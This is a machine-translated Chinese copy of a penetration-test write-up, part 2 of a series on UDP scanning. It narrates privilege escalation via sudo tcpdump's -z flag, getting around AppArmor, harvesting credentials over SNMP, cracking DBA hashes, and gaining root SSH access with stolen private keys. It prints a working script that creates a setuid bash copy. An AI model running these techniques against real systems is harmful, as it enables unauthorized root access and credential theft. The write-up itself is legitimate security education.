<html>
<head>
<title>Why you should always scan UDP ports (2/2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">为什么您应该总是扫描UDP端口(2/2)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/why-you-should-always-scan-udp-part-2-2-42050fb136d8?source=collection_archive---------1-----------------------#2020-08-20">https://infosecwriteups.com/why-you-should-always-scan-udp-part-2-2-42050fb136d8?source=collection_archive---------1-----------------------#2020-08-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="3931" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们完成了第一部分，获得了在新网络中访问主机的特权。后来，我们想获得特权继续。我们是这样做的。</p><h1 id="9fc5" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">提升权限</h1><p id="feb2" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">多年来，我一直在Linux中使用这两个脚本，每种语言一个。</p><ul class=""><li id="b4da" class="lp lq iq jp b jq jr ju jv jy lr kc ls kg lt kk lu lv lw lx bi translated"><a class="ae kl" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" rel="noopener ugc nofollow" target="_blank">https://github . com/rebootuser/LinEnum/blob/master/LinEnum . sh</a>(bash)</li><li id="4fe9" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">https://github.com/sleventyeleven/linuxprivchecker<a class="ae kl" href="https://github.com/sleventyeleven/linuxprivchecker" rel="noopener ugc nofollow" target="_blank">(巨蟒)</a></li></ul><p id="dcb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，最近我一直在用我非常喜欢的豌豆。它是用bash编写的，也有它的Windows版本，可以在。exe (C#代码)和。蝙蝠</p><pre class="md me mf mg gt mh mi mj mk aw ml bi"><span id="909a" class="mm kn iq mi b gy mn mo l mp mq"><a class="ae kl" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" rel="noopener ugc nofollow" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></span></pre><p id="a01d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于权限提升是一个非常广泛的话题，所以我不会详细介绍所有的技巧，但是我可以列出一些资源来帮助您入门:</p><div class="mr ms gp gr mt mu"><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html" rel="noopener  ugc nofollow" target="_blank"><div class="mv ab fo"><div class="mw ab mx cl cj my"><h2 class="bd ir gy z fp mz fr fs na fu fw ip bi translated">权限提升- Linux</h2><div class="nb l"><h3 class="bd b gy z fp mz fr fs na fu fw dk translated">一旦我们有了一个有限的shell，提升shell特权是很有用的。这样会更容易隐藏，阅读…</h3></div><div class="nc l"><p class="bd b dl z fp mz fr fs na fu fw dk translated">sushant747.gitbooks.io</p></div></div></div></a></div><div class="mr ms gp gr mt mu"><a href="https://payatu.com/guide-linux-privilege-escalation" rel="noopener  ugc nofollow" target="_blank"><div class="mv ab fo"><div class="mw ab mx cl cj my"><h2 class="bd ir gy z fp mz fr fs na fu fw ip bi translated">Linux权限提升指南</h2><div class="nb l"><h3 class="bd b gy z fp mz fr fs na fu fw dk translated">什么是特权升级？大多数计算机系统是为多用户使用而设计的。特权意味着什么…</h3></div><div class="nc l"><p class="bd b dl z fp mz fr fs na fu fw dk translated">payatu.com</p></div></div><div class="nd l"><div class="ne l nf ng nh nd ni nj mu"/></div></div></a></div><p id="f6f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">关于我们的pentest，我们做的第一件事是</p><pre class="md me mf mg gt mh mi mj mk aw ml bi"><span id="99f3" class="mm kn iq mi b gy mn mo l mp mq">sudo -l</span></pre><p id="7367" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这允许您查看当前用户所有可用的sudo命令。输出包括一个相关条目:</p><pre class="md me mf mg gt mh mi mj mk aw ml bi"><span id="b6e5" class="mm kn iq mi b gy mn mo l mp mq">(root) NOPASSWD: /usr/sbin/tcpdump</span></pre><p id="d522" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这用于嗅探网络流量，通常对调试应用程序开发人员很有用。由于它的-z标志，Tcpdump在sudo列表中是一个危险的二进制文件。它允许您指定在捕获结束时运行的脚本。您可以创建一个恶意脚本，捕获0个数据包，然后让它自动运行(<a class="ae kl" href="https://gtfobins.github.io/gtfobins/tcpdump/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/tcpdump/</a>)</p><p id="5752" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们尝试了以下利用方式，但没有成功。</p><pre class="md me mf mg gt mh mi mj mk aw ml bi"><span id="bd8f" class="mm kn iq mi b gy mn mo l mp mq">a=/tmp/_$$<br/>b=/tmp/$$<br/>cat &gt;$a &lt;&lt;EOF<br/>cp /bin/bash $b<br/>chmod u+sx $b<br/>EOF<br/>chmod +x $a<br/>sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $a;<br/>sleep 1<br/>$b -p</span></pre><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nk"><img src="../Images/d0600d3d75f1521d2f4dc13ee0b23431.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VzUGOgqaUed6YoeSUekXow.png"/></div></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">漏洞利用失败(语法略有变化，显示的行数更少)</figcaption></figure><p id="8e79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们基本上为文件a和b创建了新的文件名($$是BASHPID的通用变量，它在每次脚本执行时都会改变)。创建一个名为a的脚本，它执行以下操作:将/bin/bash复制到$b，并为它分配suid和执行权限。然后，我们将执行权限分配给a，并使用root权限调用tcpdump，以便在捕获完成后立即执行$a。</p><p id="3165" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以在这里看到，当我们试图执行$a时，得到了一个被拒绝的许可。</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nv"><img src="../Images/d93f8cf4800e2d92bd2fbabf9f26f498.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MtmmOyDShtFQ6IvGs_t2yg.png"/></div></div></figure><p id="6d57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我们不能运行$a，所以$b没有被创建:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/df290d8e27a2261b4d35a332194f2661.png" data-original-src="https://miro.medium.com/v2/resize:fit:908/format:webp/1*sagM0gy7Dpo_b8GQ7yAC9A.png"/></div></figure><h1 id="9f25" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">在附近工作</h1><p id="841d" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">解决问题后，我们发现Apparmor是罪魁祸首。Apparmor是一个内核模块，它实现了一个MAC策略，允许你将程序限制在有限的资源中(<a class="ae kl" href="https://wiki.ubuntu.com/AppArmor" rel="noopener ugc nofollow" target="_blank">https://wiki.ubuntu.com/AppArmor</a>)。这在Ubuntu上是默认启用的。<br/>我们可以检查它是否在我们的测试机上运行:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nx"><img src="../Images/7e91a87ca1a725bbdabf39d263f9908f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L-AskIhlA8z0zDh-ENM44Q.png"/></div></div></figure><p id="c99f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并查看其当前状态(强制/投诉)</p><pre class="md me mf mg gt mh mi mj mk aw ml bi"><span id="be3c" class="mm kn iq mi b gy mn mo l mp mq">grep tcpdump /sys/kernel/security/apparmor/profiles</span></pre><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ny"><img src="../Images/b517bf64340a34b1476988d05b1934fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HLK6jrji7DlEa57OSONCqA.png"/></div></div></figure><p id="99a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们看看这个特定二进制文件的apparmor配置文件:</p><pre class="md me mf mg gt mh mi mj mk aw ml bi"><span id="07a6" class="mm kn iq mi b gy mn mo l mp mq">root@ubuntu:/$ cat /etc/apparmor.d/usr.sbin.tcpdump</span><span id="ab8d" class="mm kn iq mi b gy nz mo l mp mq"># vim:syntax=apparmor<br/>#include &lt;tunables/global&gt;</span><span id="cf4f" class="mm kn iq mi b gy nz mo l mp mq">/usr/sbin/tcpdump {<br/> #include &lt;abstractions/base&gt;<br/> #include &lt;abstractions/nameservice&gt;<br/> #include &lt;abstractions/user-tmp&gt;</span><span id="7c74" class="mm kn iq mi b gy nz mo l mp mq">capability net_raw,<br/> capability setuid,<br/> capability setgid,<br/> capability dac_override,<br/> network raw,<br/> network packet,</span><span id="5e1f" class="mm kn iq mi b gy nz mo l mp mq"># for -D<br/> @{PROC}/bus/usb/ r,<br/> @{PROC}/bus/usb/** r,</span><span id="df04" class="mm kn iq mi b gy nz mo l mp mq"># for finding an interface<br/> @{PROC}/[0–9]*/net/dev r,<br/> /sys/bus/usb/devices/ r,<br/> /sys/class/net/ r,<br/> /sys/devices/**/net/* r,</span><span id="cdd6" class="mm kn iq mi b gy nz mo l mp mq"># for -j<br/> capability net_admin,</span><span id="4ae7" class="mm kn iq mi b gy nz mo l mp mq"># for tracing USB bus, which libpcap supports<br/> /dev/usbmon* r,<br/> /dev/bus/usb/ r,<br/> /dev/bus/usb/** r,</span><span id="5c20" class="mm kn iq mi b gy nz mo l mp mq"># for init_etherarray(), with -e<br/> /etc/ethers r,</span><span id="e5ee" class="mm kn iq mi b gy nz mo l mp mq"># for USB probing (see libpcap-1.1.x/pcap-usb-linux.c:probe_devices())<br/> /dev/bus/usb/**/[0–9]* w,</span><span id="aee0" class="mm kn iq mi b gy nz mo l mp mq"><strong class="mi ir"># for -z<br/> /{usr/,}bin/gzip ixr,<br/> /{usr/,}bin/bzip2 ixr,</strong></span><span id="acd0" class="mm kn iq mi b gy nz mo l mp mq"># for -F and -w<br/> audit deny @{HOME}/.* mrwkl,<br/> audit deny @{HOME}/.*/ rw,<br/> audit deny @{HOME}/.*/** mrwkl,<br/> audit deny @{HOME}/bin/ rw,<br/> audit deny @{HOME}/bin/** mrwkl,<br/> owner @{HOME}/ r,<br/> owner @{HOME}/** rw,</span><span id="f524" class="mm kn iq mi b gy nz mo l mp mq"># for -r, -F and -w<br/> /**.[pP][cC][aA][pP] rw,</span><span id="d6a8" class="mm kn iq mi b gy nz mo l mp mq"># for convenience with -r (ie, read pcap files from other sources)<br/> /var/log/snort/*log* r,</span><span id="34f2" class="mm kn iq mi b gy nz mo l mp mq">/usr/sbin/tcpdump mr,</span><span id="ce91" class="mm kn iq mi b gy nz mo l mp mq"># Site-specific additions and overrides. See local/README for details.<br/> #include &lt;local/usr.sbin.tcpdump&gt;<br/>}</span></pre><p id="3dbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是关键部分:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/05b4943b1481e032c7e04ec9f17e6708.png" data-original-src="https://miro.medium.com/v2/resize:fit:448/format:webp/1*jtSHdhCHED8zmzUlU-K_Sw.png"/></div></figure><p id="63ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如您所见，使用-z时，唯一允许的二进制文件是gzip或bzip2 ({usr/，}是一个<a class="ae kl" href="https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html" rel="noopener ugc nofollow" target="_blank"> bash大括号扩展</a>，它生成“usr/”和" "(空格))。这涵盖了在/bin或/usr/bin中安装了gzip或bzip2的情况。让我们展示一个例子:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ob"><img src="../Images/6ead38bd2efaea495f2ab87abaaf6494.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*F-hqzPEN2dYfe1IMRmsZqQ.png"/></div></div></figure><p id="0876" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该策略限制-z的使用，只允许压缩/解压缩日志文件(这是它最初的用途)。</p><p id="19d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以安装设备，制定投诉政策</p><pre class="md me mf mg gt mh mi mj mk aw ml bi"><span id="eee5" class="mm kn iq mi b gy mn mo l mp mq">aa-complain /usr/bin/tcpdump</span></pre><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oc"><img src="../Images/17df731e5da0758006ecafa2227d0edc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n-GNcHP9qe6Q0udJJ51adw.png"/></div></div></figure><p id="b8f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是这需要root权限(我们没有)。我们需要另一种方法。幸运的是，sudo -l中还有另一个吸引人的条目:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div class="gh gi od"><img src="../Images/1923257e149e3c42b42a3bba0918e26e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*hRbuB6EySmfhTrh-dZFq1A.png"/></div></figure><p id="8c0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是该脚本的内容:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/34a9ca884614419a95499db7d351745a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1082/format:webp/1*PDxD_qH2GKsQDx7wtZQTRA.png"/></div></figure><p id="abab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以看到没有对传递的参数进行任何验证。这可以通过以下注入来利用:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi of"><img src="../Images/ce3a3127871f4cc81bad438b699529d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9NuNSPhMPH9yUYbNInF7xw.png"/></div></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">Bash禁用Apparmor并忽略mongodb结尾。</figcaption></figure><p id="bef0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这种方法的一个注意事项是，为了使更改生效，您需要重新启动计算机。您可以等到机器重新启动，也可以通过关闭一个关键服务并等待别人重新启动来加速这个过程。在这种情况下，我们等待，大约15个小时后，机器重新启动。之后，tcpdump工作得非常好:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi og"><img src="../Images/5b0cc4c4487cb04826a2c11d91c93f91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kcjIFiyJAbfhSYDibkRdMQ.png"/></div></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">机器上的根外壳</figcaption></figure><h1 id="0fc4" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">旋转入口</h1><p id="83fe" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">在对机器进行根操作和后门操作后，我们开始对新的网段进行新的扫描。我们知道这台机器位于另一个子网上，因为snmp允许您枚举网络信息，正如您从下面的屏幕截图中看到的:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oh"><img src="../Images/64f7e89fb9cd8515bc1fbf9e9d3b16ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mQLvHFCUr_c5Qv_5pi4NdQ.png"/></div></div></figure><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oi"><img src="../Images/c448b78125f9b1b638b4f1914b32b10c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2meQ4ASFdo8zKN7jQjPaJQ.png"/></div></div></figure><p id="51d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有预感，如果这个设备是用默认的snmp证书设置的，可能网络中的大多数也是这样。我们同时启动了多个snmpwalk脚本来分析整个数据段:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oj"><img src="../Images/90128dcf6a0a0669bb18228d6ffd86b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VST2TAKU0N0T-sybCPe4pA.png"/></div></div></figure><p id="d102" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这让我们得到了一些有趣的结果:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oi"><img src="../Images/38f44916ec75758d17e81f3ebf542a04.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dy3V1owTGgd7QOtxakQ1tQ.png"/></div></div></figure><p id="9923" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是snmp扫描所有网络以查找进程命令行时nmap和snmpwalk结果的一小部分。如您所见，我们获得了多个应用程序的几个身份验证/凭证参数，包括vnc、sonar、sherman，以及到目前为止对我们最有用的inno top MySQL。</p><p id="26c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并非所有这些都有用/有效，但幸运的是，MySQL是有用的。</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oi"><img src="../Images/142e26a0044e86b55a3c02cccf7fe069.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RfbQG2K9FHONxwP4pM31tw.png"/></div></div></figure><p id="30f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个数据库又有公司所有DBA的MySQL认证散列。我们用在线哈希破解程序成功破解了三个小问题:</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/13f7bc947fafa4cb2504e4ba836045aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*rI0UI6zIyl0OpBWfa5bFvA.png"/></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">Sql身份验证哈希</figcaption></figure><figure class="md me mf mg gt nl gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/9d6a693363845e7ab30b502a2f443567.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*CsN_5m5IQHTL0vg-r__FSg.png"/></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">3个数据库管理员哈希因弱密码而被破解</figcaption></figure><h1 id="ba2d" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">后剥削</h1><p id="0919" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">这三名数据库管理员基本上允许我们访问公司的所有数据库。Pentest进行得很顺利。我们可以访问很多敏感信息，但我们仍然没有控制服务器，只是控制数据库中的数据。</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi om"><img src="../Images/44bdbd30e26d422b66256acd82d7186d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*eXKUtpOBHcXfUfYMYu-g9g.png"/></div></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">很抱歉质量，我不能重现这个证据，所以我不得不使用原始截图</figcaption></figure><p id="b42a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对我们来说不幸的是，没有一个DBA在Unix/Ad用户上重用其凭证，所以这是一个死胡同。我们在寻找带有公司名称的琐碎密码的自定义单词列表中也没有任何运气。我们即将结束pentest，这时我们开始通过一个图形前端(dbeaver)检查每个数据库的表，看看我们是否可以获得一些东西来授予我们操作系统访问权限。找了几个小时后，我们走运了。</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oi"><img src="../Images/c4bbb4ddd9687175568bfe59e9fafecd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kpz3qgqaMtSUtaazDpNazw.png"/></div></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">公共ssh密钥</figcaption></figure><p id="d123" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们有一个内部解决方案来帮助他们管理5000多台Linux主机的分布式身份验证。是的，我知道你在想什么。那些是公共的ssh密钥，它们不会帮助你登录服务器。你说得对。然而，在一次测试中，你经常不能马上得到你想要的信息。但是你确实得到了一些线索。在这种情况下，这个表让我们知道我们需要寻找私有ssh密钥。这是一个很长的机会，但也许它们被存储在某个地方(不要忘记这是一个定制的解决方案，而那些通常是有最多错误的)。</p><p id="21b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">几分钟后，我们找到了他们。</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi og"><img src="../Images/90434639abbbed319b4842860f0599d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OaG-INFUvRX3yPdxkK_p8g.png"/></div></div></figure><p id="45d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在展示调查结果时，我们有机会与系统管理员交谈，他们解释说，it的基础架构是由服务器集群组成的，特定集群中的每台服务器都有一个与注入的集群相关联的自定义密钥。您在那里看到的这些名称和关联的电子邮件对应于每个集群(向该集群的所有者发送有关特定服务器、维护等问题的通知)。</p><p id="09a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在将私有密钥复制到一个测试集群并为其分配600个权限之后，我们能够以root身份登录到该集群的每台服务器。</p><figure class="md me mf mg gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi og"><img src="../Images/17dadaa83a9dbf6539f9969b463803bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pDflO4p6haHUU81XjkdQKQ.png"/></div></div><figcaption class="nr ns gj gh gi nt nu bd b be z dk translated">(中间的大空白处其实是经过审查的motd横幅)</figcaption></figure><h1 id="1d28" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">结论</h1><p id="a34b" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">在此次评估中，我们利用了:</p><ul class=""><li id="6073" class="lp lq iq jp b jq jr ju jv jy lr kc ls kg lt kk lu lv lw lx bi translated">弱凭证(来自MySQL的凭证)</li><li id="2fe8" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">糟糕的执行实践(使用凭据作为参数运行命令)</li><li id="0145" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">弱身份验证方案(在数据库中保存私钥)</li><li id="ef44" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">没有参数验证的易受攻击的脚本</li><li id="50df" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">易受攻击的sudo二进制文件</li></ul><p id="f109" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是到了最后，一切都是由于UDP扫描而开始的。</p><p id="1179" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以这个故事的寓意是:<strong class="jp ir">不要忘记你在nmap上的-sU</strong>。它可能不总是奏效，但当它奏效时，它是值得的！</p></div></div>    
</body>
</html>